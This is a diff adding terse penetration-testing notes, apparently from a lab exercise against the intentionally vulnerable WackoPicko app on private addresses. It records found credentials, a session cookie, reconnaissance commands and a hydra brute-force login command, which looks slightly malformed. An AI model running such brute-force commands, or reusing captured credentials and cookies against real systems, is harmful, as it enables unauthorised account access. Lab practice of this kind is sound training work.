@@ -1,0 +1,13 @@
+found admin:admin
+
+[+] E-mail Found: contact@wackopicko.com
+
+wget -q --server-response http://10.10.68.138 
+curl -I http://10.10.68.138
+
+hydra -L new_wordlist.txt-P new_wordlist.txt 10.10.112.108 http-post-form "/users/login.php:username=^PASS^&password=^PASS^:The username/password combination you have entered is invalid" -t 4
+
+PHPSESSID=lic6e2oa10e62sljkcsrkrmdt5
+
+other username: bryce:bryce
+
